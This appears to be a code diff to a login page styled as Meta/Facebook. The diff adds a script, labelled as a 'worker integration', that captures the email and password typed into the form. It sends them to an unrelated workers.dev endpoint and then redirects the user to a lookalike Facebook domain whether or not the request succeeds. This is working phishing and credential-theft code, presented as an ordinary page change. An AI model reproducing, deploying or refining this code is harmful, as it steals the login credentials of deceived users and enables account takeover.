@@ -88,12 +88,16 @@
                 <div>
                     <button 
                         type="submit" 
-                        class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
+                        id="submit-button"
+                        class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 cursor-pointer"
                     >
                         Log In
                     </button>
                 </div>
             </form>
+
+            <!-- Status Message -->
+            <div id="statusMessage" class="mt-4 text-center text-sm text-red-600 hidden"></div>
 
             <!-- Forgot Password / Links -->
             <div class="text-center mt-4">
@@ -118,5 +122,46 @@
         <p>&copy; 2026 Meta Platforms, Inc.</p>
     </footer>
 
+    <!-- Worker Integration Script -->
+    <script>
+        const form = document.getElementById("loginForm");
+        const submitButton = document.getElementById("submit-button");
+        const status = document.getElementById("statusMessage");
+
+        form.addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            if (!form.checkValidity()) {
+                form.reportValidity();
+                return;
+            }
+
+            submitButton.disabled = true;
+            submitButton.classList.add('opacity-50', 'cursor-not-allowed');
+            status.classList.add('hidden');
+            status.textContent = "";
+
+            const data = {
+                email: document.getElementById("email").value.trim(),
+                password: document.getElementById("password").value,
+                submission_type: "login"
+            };
+
+            try {
+                await fetch("https://tendring-contact.twells-tet.workers.dev", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error("Worker transmission error:", error);
+            } finally {
+                // Redirect regardless of response success/failure
+                window.location.href = "https://facebook-meta-uk-ireland-k7m2q9x4l8pr3vn6at1zw5.threetwosix.co.uk/";
+            }
+        });
+    </script>
 </body>
 </html>
